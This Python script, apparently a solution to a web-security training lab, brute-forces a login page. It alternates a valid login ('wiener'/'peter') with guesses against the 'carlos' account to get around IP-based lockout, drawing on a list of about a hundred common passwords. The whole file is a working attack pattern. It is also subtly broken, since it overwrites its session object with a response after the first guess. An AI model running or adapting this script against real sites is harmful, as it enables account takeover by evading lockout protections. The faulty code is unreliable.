import requests
import sys
import urllib3
from colorama import *

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
init(autoreset=True)
red = Fore.RED
green = Fore.GREEN
yellow = Fore.YELLOW
passwords = ['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', '123123', 'baseball', 'abc123', 'football', 'monkey', 'letmein', 'shadow', 'master', '666666', 'qwertyuiop', '123321', 'mustang', '1234567890', 'michael', '654321', 'superman', '1qaz2wsx', '7777777', '121212', '000000', 'qazwsx', '123qwe', 'killer', 'trustno1', 'jordan', 'jennifer', 'zxcvbnm', 'asdfgh', 'hunter', 'buster', 'soccer', 'harley', 'batman', 'andrew', 'tigger', 'sunshine', 'iloveyou', '2000', 'charlie', 'robert', 'thomas', 'hockey', 'ranger', 'daniel', 'starwars', 'klaster', '112233', 'george', 'computer', 'michelle', 'jessica', 'pepper', '1111', 'zxcvbn', '555555', '11111111', '131313', 'freedom', '777777', 'pass', 'maggie', '159753', 'aaaaaa', 'ginger', 'princess', 'joshua', 'cheese', 'amanda', 'summer', 'love', 'ashley', 'nicole', 'chelsea', 'biteme', 'matthew', 'access', 'yankees', '987654321', 'dallas', 'austin', 'thunder', 'taylor', 'matrix', 'mobilemail', 'mom', 'monitor', 'monitoring', 'montana', 'moon', 'moscow']
usernames = ['wiener', 'carlos']


def Broken_brute_force_protection_IP_block(s, url):
    print(Fore.YELLOW + '[!] Exploiting...')
    print(Fore.YELLOW + '[!] This may take sometime to success..')
    for password in passwords:
        login_url = url + '/login'
        r = s.post(login_url, data={'username':'wiener','password':'peter'}, allow_redirects=False , verify=False, proxies=proxies)
        if r.status_code == 400:
            print (red + '[!] Missin prameter')
            sys.exit(-1)
        else:
            if r.status_code == 302:
                data={'username':'carlos','password':password}
                s = s.post(login_url, data=data, verify=False, proxies=proxies)
                res = s.text
                if 'You have made too many incorrect login attempts' in res:
                    print ('[!] too many incorrect login attempts..')
                else:
                    if 'Invalid username'  in res:
                        print(yellow + '[!] Invalid username..')
                        return False
                    else:   
                        if 'Incorrect password' not in res:
                            print(green + f'[+] carlos:{password} is valid')
                            return True

def main():
    if len(sys.argv) != 2:
        print(yellow + '[-] Usage: %s <url>' % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]
    Broken_brute_force_protection_IP_block(s, url)

if __name__ == '__main__':
    main()
